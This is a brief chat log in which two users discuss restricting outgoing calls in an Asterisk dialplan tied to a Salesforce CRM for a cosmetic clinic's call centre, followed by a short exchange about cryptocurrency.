[18.11.21 13:29:47] Verto: They will call a woman who had a lip augmentation six months ago and will call her every three to six months.
[18.11.21 13:30:21] moby: CRM is responsible for this
[18.11.21 13:31:47] Verto: for the client, from his click on the banner, to the conclusion of the contract\.
[18.11.21 13:32:53] moby: your goal is to block 10 thousand users who call from outside the office or who call from the office to outside
[18.11.21 13:33:26] Verto: Yeah.
[18.11.21 13:33:57] Verto: so callers wouldn't call those who already bought them (it's how callers boost their sales)
[18.11.21 13:34:13] Verto: CRM Salesforce
[18.11.21 13:34:26] moby: NC only
[18.11.21 13:34:31] moby: the easiest
[18.11.21 13:35:10] Verto: outgoing!
[18.11.21 13:35:42] Verto: the built-in chs for incoming from the world works
[18.11.21 13:36:04] moby: well, that's a question
[18.11.21 13:36:46] moby: I'm inclined to put them a group policy ( so called ), that they could not call .
[18.11.21 13:37:13] Verto: you can try to do Dialplan 2 in a separate database on postgre, say
[18.11.21 13:38:16] Verto: there are groups in astera ) but that's different, in any case they go through the dialplan afterwards
[18.11.21 13:41:29] Verto: just like you can call Jerusalem, but you can't call Eilat
it's 10 lines.
[18.11.21 17:49:07] moby: do you play cryptocurrency by any chance?
[19.11.21 01:00:57] Verto: it's too complicated and the actual result doesn't depend on me, it's like playing poker or slot machines, in any case the casino will win.
